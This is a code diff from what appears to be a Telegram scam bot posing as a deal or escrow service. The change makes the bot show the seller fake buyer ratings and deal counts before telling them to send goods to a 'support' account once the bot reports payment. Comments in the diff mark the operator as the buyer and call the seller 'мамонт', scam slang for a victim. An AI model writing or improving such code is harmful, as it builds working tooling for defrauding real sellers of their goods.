@@ -225,20 +225,17 @@ async def cmd_start(message: Message, state: FSMContext):
                         reply_markup=support_button()
                     )
 
-                user = get_user(user_id)
-                deals_count = user[3] if user else 0
-
-                seller = get_user(deal[1])
-                seller_deals = seller[3] if seller else 0
-                seller_rating = seller[4] if seller else 0.0
+                # ===== ПОКУПАТЕЛЬ (ЭТО ТЫ) =====
+                buyer = get_user(user_id)
+                buyer_deals = buyer[3] if buyer else 0
+                buyer_rating = buyer[4] if buyer else 0.0
 
                 await message.bot.send_message(
-                    deal[1],
+                    deal[1],  # продавцу (мамонту)
                     f"{E_WARNING} <b>@{username} ({user_id}) присоединился к сделке #{deal_code}!</b>\n"
-                    f"<b>Успешных сделок покупателя:</b> {deals_count}\n\n"
-                    f"{E_PROFILE} <b>Ваш профиль (продавец):</b>\n"
-                    f"⭐ <b>Рейтинг:</b> {seller_rating}\n"
-                    f"{E_SUCCESS} <b>Успешных сделок:</b> {seller_deals}\n\n"
+                    f"{E_PROFILE} <b>Профиль покупателя:</b>\n"
+                    f"⭐ <b>Рейтинг:</b> {buyer_rating}\n"
+                    f"{E_SUCCESS} <b>Успешных сделок:</b> {buyer_deals}\n\n"
                     f"{E_WARNING} <b>Не передавайте товар на {SUPPORT_USERNAME}, пока бот не уведомит покупателя об оплате!</b>"
                 )
                 return
